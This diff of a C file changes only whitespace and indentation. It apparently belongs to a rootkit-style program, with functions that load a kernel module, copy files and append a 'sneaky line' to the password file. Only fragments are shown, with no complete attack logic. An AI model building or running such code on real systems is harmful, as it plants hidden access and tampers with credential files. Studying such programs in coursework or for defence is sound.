@@ -48,8 +48,6 @@ void unload_module(){
 }
 
 
-
-
 void load_module(){
 
   pid_t parent_process = pid; 
@@ -72,6 +70,7 @@ void load_module(){
       exit(EXIT_FAILURE);
     }
     printf("Uploading module for exploit\n");
+
   }
 
   else{
@@ -118,7 +117,7 @@ void copy_file(char * src,  char * destination){
       if(wait_pid < 0){
 	perror("waitpid error");
         exit(EXIT_FAILURE);
-	}
+      }
 
     } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
     
@@ -131,7 +130,7 @@ void add_sneaky_line (char * filename){
 
     FILE * file;
     file = fopen(filename, "a"); //open file in append mode
-  if(file == NULL) {
+    if(file == NULL) {
     perror("Error opening the password file.");
   }
   else{
